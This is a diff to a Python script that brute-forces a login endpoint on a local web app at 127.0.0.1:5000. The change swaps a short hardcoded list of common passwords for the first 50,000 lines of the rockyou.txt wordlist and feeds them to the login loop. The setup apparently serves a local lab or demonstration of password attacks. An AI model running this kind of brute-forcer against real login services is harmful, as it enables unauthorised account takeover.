@@ -10,13 +10,12 @@ BASE_DIR = os.path.dirname(os.path.dirname(__file__))
 BASE_URL = "http://127.0.0.1:5000"
 USERS_FILE = os.path.join(BASE_DIR, "data", "users.json")
 LOG_FILE = os.path.join(BASE_DIR, "logs", "attempts.log")
+WORDLIST_PATH = os.path.join(BASE_DIR, "data", "rockyou.txt")
 
-PASSWORD_LIST = [
-    "123456", "password", "letmein", "qwerty", "secret", "welcome",
-    "ilovedogs", "ilovecats", "000000", "123321", "abc123", "admin",
-    "summer2025", "fall2023", "music2025", "coffee321", "soccer75",
-    "HappyDays88", "532645069", "mypassword"
-]
+def load_wordlist(limit=50000):
+    with open(WORDLIST_PATH, "r", encoding="latin-1") as f:
+        # read lines, strip newline, take first N entries
+        return [line.strip() for line in f if line.strip()][:limit]
 
 def load_users():
     with open(USERS_FILE, "r") as f:
@@ -31,6 +30,7 @@ def brute_force(username):
 
     hash_mode = target.get("hash_mode", "sha256")
 
+    PASSWORD_LIST = load_wordlist()
     for candidate in PASSWORD_LIST:
         start = time.time()
         resp = requests.post(f"{BASE_URL}/login", json={
